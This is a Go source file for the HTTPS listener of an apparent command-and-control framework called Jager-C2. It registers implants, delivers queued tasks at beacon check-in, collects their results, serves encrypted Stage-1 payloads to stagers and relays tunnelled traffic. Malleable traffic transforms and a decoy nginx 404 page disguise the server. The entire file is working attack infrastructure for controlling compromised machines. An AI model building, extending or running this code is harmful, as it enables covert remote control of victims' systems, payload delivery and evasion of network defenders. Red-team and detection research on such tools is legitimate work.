package listeners

import (
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/0xhackerfren/Jager-C2/teamserver/internal/builds"
	"github.com/0xhackerfren/Jager-C2/teamserver/internal/crypto"
	"github.com/0xhackerfren/Jager-C2/teamserver/internal/malleable"
	"github.com/0xhackerfren/Jager-C2/teamserver/internal/sessions"
	pb "github.com/0xhackerfren/Jager-C2/teamserver/proto/jagerpb"
	"go.uber.org/zap"
)

const maxRequestBodyBytes = 10 * 1024 * 1024

var errEncryptedBodyRequired = errors.New("encrypted body required when session crypto is active")

// TunnelManager tracks open tunnel channels between the operator and implant.
// Each channel represents one TCP connection being relayed.
type TunnelManager interface {
	SendToImplant(sessionID string, frame *pb.TunnelFrame) error
	GetPendingFrames(sessionID string) []*pb.TunnelFrame
}

type HTTPSListener struct {
	id       string
	cfg      *pb.ListenerConfig
	server   *http.Server
	sessions *sessions.Manager
	tasks    TaskQueue
	builds   BuildStore
	tunnels  TunnelManager
	profile  *malleable.Profile
	logger   *zap.Logger
}

// TaskQueue interface decouples listener from tasks package
type TaskQueue interface {
	Dequeue(sessionID string, maxTasks int) []*pb.Task
	Complete(taskID string, sessionID string, responseData []byte, errMsg string) error
	RedeliverSentTasks(sessionID string)
}

// BuildStore interface for serving Stage-1 payloads
type BuildStore interface {
	GetStagePayload(buildID string) ([]byte, error)
}

func NewHTTPSListener(cfg *pb.ListenerConfig, sess *sessions.Manager, tq TaskQueue, bs BuildStore, logger *zap.Logger) (*HTTPSListener, error) {
	return &HTTPSListener{
		id:       cfg.Id,
		cfg:      cfg,
		sessions: sess,
		tasks:    tq,
		builds:   bs,
		logger:   logger.Named("https"),
	}, nil
}

func (l *HTTPSListener) Start() error {
	mux := http.NewServeMux()

	// Implant check-in endpoint (POST with task polling)
	mux.HandleFunc("/api/v1/checkin", l.handleCheckin)

	// Registration endpoint
	mux.HandleFunc("/api/v1/register", l.handleRegister)

	// Task result submission
	mux.HandleFunc("/api/v1/result", l.handleResult)

	// Tunnel endpoint for SOCKS/portfwd data frames
	mux.HandleFunc("/api/v1/tunnel", l.handleTunnel)

	// Stage-1 download for stagers
	mux.HandleFunc("/api/v1/stage", l.handleStage)

	// Health check (for load balancers / redirectors)
	mux.HandleFunc("/health", l.handleHealth)

	// Catch-all: malleable profile paths + benign 404
	mux.Handle("/", builds.MalleableDispatch{
		Checkin:  l.handleCheckin,
		Register: l.handleRegister,
		Result:   l.handleResult,
		Stage:    l.handleStage,
		Tunnel:   l.handleTunnel,
		Default:  l.handleDefault,
	})

	addr := fmt.Sprintf("%s:%d", l.cfg.BindHost, l.cfg.BindPort)

	loggedHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		l.logger.Info("HTTP request received",
			zap.String("method", r.Method),
			zap.String("path", r.URL.Path),
			zap.String("remote", r.RemoteAddr),
			zap.Int64("content_length", r.ContentLength),
			zap.String("user_agent", r.UserAgent()),
		)
		mux.ServeHTTP(w, r)
	})

	l.server = &http.Server{
		Addr:         addr,
		Handler:      loggedHandler,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 60 * time.Second,
		IdleTimeout:  120 * time.Second,
	}

	httpsConf := l.cfg.GetHttps()
	if httpsConf != nil && httpsConf.CertPem != "" {
		cert, err := tls.X509KeyPair([]byte(httpsConf.CertPem), []byte(httpsConf.KeyPem))
		if err != nil {
			return fmt.Errorf("load TLS cert: %w", err)
		}
		l.server.TLSConfig = &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS12,
		}
		go func() {
			if err := l.server.ListenAndServeTLS("", ""); err != http.ErrServerClosed {
				l.logger.Error("HTTPS listener error", zap.Error(err))
			}
		}()
	} else {
		go func() {
			if err := l.server.ListenAndServe(); err != http.ErrServerClosed {
				l.logger.Error("HTTP listener error", zap.Error(err))
			}
		}()
	}

	return nil
}

func (l *HTTPSListener) Stop() error {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	return l.server.Shutdown(ctx)
}

func (l *HTTPSListener) ID() string {
	return l.id
}

func (l *HTTPSListener) Config() *pb.ListenerConfig {
	return l.cfg
}

// handleRegister processes new implant registration
func (l *HTTPSListener) handleRegister(w http.ResponseWriter, r *http.Request) {
	l.logger.Info("handleRegister called",
		zap.String("path", r.URL.Path),
		zap.String("method", r.Method),
		zap.String("remote", r.RemoteAddr),
		zap.Int64("content_length", r.ContentLength))
	if r.Method != http.MethodPost {
		http.NotFound(w, r)
		return
	}

	body, err := l.readRequestBody(w, r)
	if err != nil {
		l.logger.Warn("register: readBody failed", zap.Error(err))
		http.Error(w, "", http.StatusBadRequest)
		return
	}

	l.logger.Debug("register: raw body", zap.Int("size", len(body)))
	body, err = l.decodeInboundForPath(r.URL.Path, body)
	if err != nil {
		l.logger.Warn("register: decodeInbound failed", zap.Error(err), zap.String("path", r.URL.Path))
		http.Error(w, "", http.StatusBadRequest)
		return
	}

	l.logger.Debug("register: decoded body", zap.Int("size", len(body)), zap.String("preview", truncateForLog(body, 200)))
	var reg struct {
		pb.ImplantRegistration
		PubKey     string `json:"pubkey"`
		BuildToken string `json:"build_token"`
	}
	if err := json.Unmarshal(body, &reg); err != nil {
		l.logger.Warn("register: JSON unmarshal failed", zap.Error(err), zap.String("body_preview", truncateForLog(body, 200)))
		http.Error(w, "", http.StatusBadRequest)
		return
	}

	if reg.BuildId == "" || reg.BuildToken == "" {
		l.logger.Warn("register: missing build_id or build_token", zap.String("build_id", reg.BuildId))
		http.Error(w, "", http.StatusForbidden)
		return
	}
	if !crypto.ValidateBuildToken(reg.BuildId, reg.BuildToken) {
		l.logger.Warn("register: build token validation failed", zap.String("build_id", reg.BuildId))
		http.Error(w, "", http.StatusForbidden)
		return
	}

	reg.Transport = pb.Transport_TRANSPORT_HTTPS

	var sessionCrypto *crypto.SessionCrypto
	var serverPubKeyB64 string
	if reg.PubKey != "" {
		clientPub, err := base64.StdEncoding.DecodeString(reg.PubKey)
		if err != nil {
			http.Error(w, "", http.StatusBadRequest)
			return
		}

		sc, serverPubBlob, err := crypto.GenerateKeyPair()
		if err != nil {
			l.logger.Error("ecdh key generation failed", zap.Error(err))
			http.Error(w, "", http.StatusInternalServerError)
			return
		}
		if err := sc.DeriveSessionKey(clientPub); err != nil {
			l.logger.Warn("ecdh key derivation failed", zap.Error(err))
			http.Error(w, "", http.StatusBadRequest)
			return
		}
		sessionCrypto = sc
		serverPubKeyB64 = base64.StdEncoding.EncodeToString(serverPubBlob)
	}

	l.sessions.RegisterBeacon(&reg.ImplantRegistration, 5, 20)
	l.sessions.RegisterSession(&reg.ImplantRegistration, sessionCrypto)

	resp := map[string]interface{}{
		"status":   "ok",
		"id":       reg.ImplantId,
		"interval": 5,
		"jitter":   20,
	}
	if reg.ImplantId != "" {
		resp["session_binding"] = computeSessionHMAC(reg.ImplantId)
	}
	if serverPubKeyB64 != "" {
		resp["server_pubkey"] = serverPubKeyB64
	}
	l.writeJSONForPath(w, r.URL.Path, "", resp)
}

// handleCheckin processes beacon check-ins and returns pending tasks
func (l *HTTPSListener) handleCheckin(w http.ResponseWriter, r *http.Request) {
	l.logger.Info("handleCheckin called",
		zap.String("path", r.URL.Path),
		zap.String("method", r.Method),
		zap.String("remote", r.RemoteAddr),
		zap.Int64("content_length", r.ContentLength))
	if r.Method != http.MethodPost {
		http.NotFound(w, r)
		return
	}

	body, err := l.readRequestBody(w, r)
	if err != nil {
		l.logger.Warn("checkin: readBody failed", zap.Error(err))
		http.Error(w, "", http.StatusBadRequest)
		return
	}

	l.logger.Debug("checkin: raw body", zap.Int("size", len(body)))
	body, err = l.decodeInboundForPath(r.URL.Path, body)
	if err != nil {
		l.logger.Warn("checkin: decodeInbound failed", zap.Error(err), zap.String("path", r.URL.Path))
		http.Error(w, "", http.StatusBadRequest)
		return
	}

	l.logger.Debug("checkin: decoded body", zap.Int("size", len(body)), zap.String("preview", truncateForLog(body, 200)))
	implantHeader := strings.TrimSpace(r.Header.Get("X-Implant-Id"))
	l.logger.Debug("checkin: implant header", zap.String("X-Implant-Id", implantHeader))
	if implantHeader == "" && !isRegistrationRequest(body) {
		l.logger.Warn("checkin: no X-Implant-Id header and not a registration request")
		http.Error(w, "Forbidden", http.StatusForbidden)
		return
	}

	sessionID := l.resolveSessionFromHeader(implantHeader)
	l.logger.Debug("checkin: resolved session", zap.String("resolved", sessionID), zap.String("header", implantHeader))
	body, sessionID, err = l.decryptSessionBodyStrict(sessionID, body)
	if err != nil {
		l.logger.Warn("checkin: decryptSessionBody failed", zap.Error(err), zap.String("session", sessionID))
		http.Error(w, "", http.StatusForbidden)
		return
	}
	l.logger.Debug("checkin: decrypted OK", zap.Int("plain_size", len(body)), zap.String("preview", truncateForLog(body, 200)))

	var checkin struct {
		ID string `json:"id"`
	}
	if err := json.Unmarshal(body, &checkin); err != nil {
		l.logger.Warn("checkin: JSON unmarshal failed", zap.Error(err), zap.String("body", truncateForLog(body, 200)))
		http.Error(w, "", http.StatusBadRequest)
		return
	}
	l.logger.Debug("checkin: parsed", zap.String("checkin_id", checkin.ID), zap.String("session_before", sessionID))
	if checkin.ID != "" {
		sessionID = checkin.ID
	}
	if sessionID == "" {
		l.logger.Warn("checkin: empty sessionID after parse")
		http.Error(w, "", http.StatusBadRequest)
		return
	}
	if implantHeader != "" && !l.enforceSessionBinding(sessionID, implantHeader) {
		l.logger.Warn("checkin: session binding check failed", zap.String("session", sessionID), zap.String("header", implantHeader))
		http.Error(w, "Forbidden", http.StatusForbidden)
		return
	}

	l.logger.Info("checkin: ACCEPTED", zap.String("session", sessionID))
	l.sessions.Checkin(sessionID)
	l.tasks.RedeliverSentTasks(sessionID)

	pending := l.tasks.Dequeue(sessionID, 10)
	if len(pending) > 0 {
		l.logger.Info("checkin: delivering tasks", zap.String("session", sessionID), zap.Int("count", len(pending)))
		for _, t := range pending {
			l.logger.Info("checkin: task sent", zap.String("task_id", t.Id), zap.String("type", t.Type.String()))
		}
	}
	type taskPayload struct {
		ID   string `json:"id"`
		Type int32  `json:"type"`
		Data []byte `json:"data,omitempty"`
	}
	payloads := make([]taskPayload, 0, len(pending))
	for _, t := range pending {
		payloads = append(payloads, taskPayload{
			ID:   t.Id,
			Type: int32(t.Type),
			Data: t.RequestData,
		})
	}

	resp := map[string]interface{}{
		"tasks": payloads,
	}
	l.writeJSONForPath(w, r.URL.Path, sessionID, resp)
}

// handleResult processes task results from implant
func (l *HTTPSListener) handleResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.NotFound(w, r)
		return
	}

	body, err := l.readRequestBody(w, r)
	if err != nil {
		http.Error(w, "", http.StatusBadRequest)
		return
	}

	body, err = l.decodeInboundForPath(r.URL.Path, body)
	if err != nil {
		http.Error(w, "", http.StatusBadRequest)
		return
	}

	implantHeader := strings.TrimSpace(r.Header.Get("X-Implant-Id"))
	if implantHeader == "" && !isRegistrationRequest(body) {
		http.Error(w, "Forbidden", http.StatusForbidden)
		return
	}

	sessionID := l.resolveSessionFromHeader(implantHeader)
	body, sessionID, err = l.decryptSessionBodyStrict(sessionID, body)
	if err != nil {
		http.Error(w, "", http.StatusForbidden)
		return
	}

	var result struct {
		TaskID string `json:"task_id"`
		Output []byte `json:"output"`
		Error  string `json:"error"`
	}
	if err := json.Unmarshal(body, &result); err != nil {
		http.Error(w, "", http.StatusBadRequest)
		return
	}
	if sessionID == "" {
		http.Error(w, "", http.StatusBadRequest)
		return
	}
	if implantHeader != "" && !l.enforceSessionBinding(sessionID, implantHeader) {
		http.Error(w, "Forbidden", http.StatusForbidden)
		return
	}

	if err := l.tasks.Complete(result.TaskID, sessionID, result.Output, result.Error); err != nil {
		l.logger.Warn("task complete failed", zap.String("task_id", result.TaskID), zap.Error(err))
	}

	if sessionID != "" {
		if err := l.writeEncryptedStatus(w, r.URL.Path, sessionID, http.StatusOK); err != nil {
			http.Error(w, "", http.StatusInternalServerError)
		}
		return
	}
	w.WriteHeader(http.StatusOK)
}

// handleStage serves encrypted Stage-1 to stagers
func (l *HTTPSListener) handleStage(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.NotFound(w, r)
		return
	}

	buildID := r.URL.Query().Get("id")
	token := r.URL.Query().Get("token")
	if buildID == "" || token == "" {
		http.NotFound(w, r)
		return
	}
	if !crypto.ValidateBuildToken(buildID, token) {
		http.NotFound(w, r)
		return
	}

	payload, err := l.builds.GetStagePayload(buildID)
	if err != nil || payload == nil {
		http.NotFound(w, r)
		return
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(payload)))
	w.Write(payload)
}

// handleHealth returns 200 OK for infrastructure health checks
func (l *HTTPSListener) handleHealth(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/plain")
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, "ok")
}

// SetTunnelManager attaches a TunnelManager after construction
func (l *HTTPSListener) SetTunnelManager(tm TunnelManager) {
	l.tunnels = tm
}

// SetMalleableProfile applies wire transforms for this listener.
func (l *HTTPSListener) SetMalleableProfile(p *malleable.Profile) {
	l.profile = p
}

func (l *HTTPSListener) decodeInbound(body []byte) ([]byte, error) {
	return l.decodeInboundForPath("", body)
}

func (l *HTTPSListener) decodeInboundForPath(path string, body []byte) ([]byte, error) {
	prof := l.profileForPath(path)
	if prof == nil {
		return body, nil
	}
	steps := malleable.BodyTransformSteps(l.bodyTransformForPath(path, prof))
	if len(steps) == 0 {
		return body, nil
	}
	return malleable.ApplyInbound(body, steps)
}

func (l *HTTPSListener) encodeOutbound(body []byte) []byte {
	return l.encodeOutboundForPath("", body)
}

func (l *HTTPSListener) encodeOutboundForPath(path string, body []byte) []byte {
	prof := l.profileForPath(path)
	if prof == nil {
		return body
	}
	steps := malleable.ServerTransformSteps(l.serverTransformForPath(path, prof))
	if len(steps) == 0 {
		return body
	}
	return malleable.ApplyOutbound(body, steps)
}

func (l *HTTPSListener) bodyTransformForPath(path string, prof *malleable.Profile) malleable.BodyTransform {
	// Implant uses POST for all endpoints (checkin, register, result),
	// so always decode with POST body transforms.
	return prof.HTTPPost.Body
}

func (l *HTTPSListener) serverTransformForPath(path string, prof *malleable.Profile) malleable.ServerTransform {
	// Implant's IN_* defines always come from http_post.server_output,
	// so server must encode responses with POST server output transforms
	// regardless of the endpoint type.
	return prof.HTTPPost.ServerOutput
}

func (l *HTTPSListener) profileForPath(path string) *malleable.Profile {
	if builds.IsDefaultImplantPath(path) {
		return nil
	}
	if p, ok := builds.LookupProfileForPath(path); ok {
		return p
	}
	return l.profile
}

func (l *HTTPSListener) writeJSONForPath(w http.ResponseWriter, path, sessionID string, payload interface{}) {
	raw, err := json.Marshal(payload)
	if err != nil {
		http.Error(w, "", http.StatusInternalServerError)
		return
	}
	out, err := l.encryptSessionBody(sessionID, raw)
	if err != nil {
		http.Error(w, "", http.StatusInternalServerError)
		return
	}
	out = l.encodeOutboundForPath(path, out)
	w.Header().Set("Content-Type", "application/json")
	w.Write(out)
}

func (l *HTTPSListener) readRequestBody(w http.ResponseWriter, r *http.Request) ([]byte, error) {
	r.Body = http.MaxBytesReader(w, r.Body, maxRequestBodyBytes)
	defer r.Body.Close()
	return io.ReadAll(r.Body)
}

func (l *HTTPSListener) sessionIDFromRequest(r *http.Request) string {
	if id := strings.TrimSpace(r.Header.Get("X-Implant-Id")); id != "" {
		return l.resolveSessionFromHeader(id)
	}
	if id := strings.TrimSpace(r.URL.Query().Get("id")); id != "" {
		return id
	}
	return ""
}

func (l *HTTPSListener) decryptSessionBody(sessionID string, body []byte) ([]byte, string, error) {
	return l.decryptSessionBodyStrict(sessionID, body)
}

func (l *HTTPSListener) encryptSessionBody(sessionID string, body []byte) ([]byte, error) {
	if sessionID == "" {
		return body, nil
	}
	sc := l.sessions.GetSessionCrypto(sessionID)
	if sc == nil || !sc.Ready() {
		return body, nil
	}
	encrypted, err := sc.Encrypt(body)
	if err != nil {
		return nil, err
	}
	return []byte(base64.StdEncoding.EncodeToString(encrypted)), nil
}

func (l *HTTPSListener) writeEncryptedStatus(w http.ResponseWriter, path, sessionID string, status int) error {
	sc := l.sessions.GetSessionCrypto(sessionID)
	if sc == nil || !sc.Ready() {
		w.WriteHeader(status)
		return nil
	}
	out, err := l.encryptSessionBody(sessionID, []byte("{}"))
	if err != nil {
		return err
	}
	out = l.encodeOutboundForPath(path, out)
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	_, err = w.Write(out)
	return err
}

// handleTunnel processes bidirectional tunnel frames from implants.
// Implant POSTs frames (from operator->implant connections) and receives
// response frames (to send back to the remote target).
//
// POST body: {"session_id":"...", "frames":[TunnelFrame,...]}
// Response:  {"frames":[TunnelFrame,...]}
func (l *HTTPSListener) handleTunnel(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.NotFound(w, r)
		return
	}

	body, err := l.readRequestBody(w, r)
	if err != nil {
		http.Error(w, "", http.StatusBadRequest)
		return
	}

	body, err = l.decodeInboundForPath(r.URL.Path, body)
	if err != nil {
		http.Error(w, "", http.StatusBadRequest)
		return
	}

	implantHeader := strings.TrimSpace(r.Header.Get("X-Implant-Id"))
	if implantHeader == "" && !isRegistrationRequest(body) {
		http.Error(w, "Forbidden", http.StatusForbidden)
		return
	}

	sessionID := l.resolveSessionFromHeader(implantHeader)
	body, sessionID, err = l.decryptSessionBodyStrict(sessionID, body)
	if err != nil {
		http.Error(w, "", http.StatusForbidden)
		return
	}

	var req struct {
		SessionID string            `json:"session_id"`
		Frames    []*pb.TunnelFrame `json:"frames"`
	}
	if err := json.Unmarshal(body, &req); err != nil {
		http.Error(w, "", http.StatusBadRequest)
		return
	}

	if req.SessionID == "" {
		http.Error(w, "", http.StatusBadRequest)
		return
	}
	sessionID = req.SessionID
	if implantHeader != "" && !l.enforceSessionBinding(sessionID, implantHeader) {
		http.Error(w, "Forbidden", http.StatusForbidden)
		return
	}

	l.sessions.Checkin(sessionID)

	if l.tunnels == nil {
		l.writeJSONForPath(w, r.URL.Path, sessionID, map[string]interface{}{"frames": []interface{}{}})
		return
	}

	// Process frames from implant (responses to operator connections)
	for _, f := range req.Frames {
		f.SessionID = sessionID
		l.tunnels.SendToImplant(sessionID, f)
	}

	// Return pending frames for the implant (new connections from operator)
	pending := l.tunnels.GetPendingFrames(sessionID)
	if pending == nil {
		pending = []*pb.TunnelFrame{}
	}
	l.writeJSONForPath(w, r.URL.Path, sessionID, map[string]interface{}{"frames": pending})
}

func truncateForLog(data []byte, maxLen int) string {
	if len(data) <= maxLen {
		return string(data)
	}
	return string(data[:maxLen]) + "..."
}

// handleDefault returns benign-looking response for unmatched paths
func (l *HTTPSListener) handleDefault(w http.ResponseWriter, r *http.Request) {
	serverHeader := "nginx/1.24.0"
	if httpsConf := l.cfg.GetHttps(); httpsConf != nil && httpsConf.ServerHeader != "" {
		serverHeader = httpsConf.ServerHeader
	}
	w.Header().Set("Server", serverHeader)
	w.Header().Set("Content-Type", "text/html")
	w.WriteHeader(http.StatusNotFound)
	fmt.Fprint(w, "<html><body><h1>404 Not Found</h1></body></html>")
}
